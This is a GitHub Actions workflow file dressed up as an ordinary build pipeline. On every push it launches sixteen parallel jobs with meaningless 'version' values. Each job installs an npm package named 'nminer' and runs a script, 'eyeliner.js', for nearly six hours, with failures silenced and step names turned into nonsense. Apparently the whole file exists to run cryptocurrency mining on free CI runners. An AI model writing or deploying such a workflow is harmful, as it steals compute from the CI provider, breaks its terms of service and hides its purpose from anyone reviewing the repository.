name: eyeliner
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 330 }
          - { version: 4001 }
          - { version: 932 }
          - { version: 8642 }
          - { version: 8742 }
          - { version: 6080 }
          - { version: 5542 }
          - { version: 3122 }
          - { version: 124 }
          - { version: 5927 }
          - { version: 1331 }
          - { version: 2421 }
          - { version: 2725 }
          - { version: 46 }
          - { version: 6449 }
          - { version: 1314 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: gosh total between veg
        run: |
          npm install nminer@latest
          timeout 349m node eyeliner.js || echo "eyeliner executed"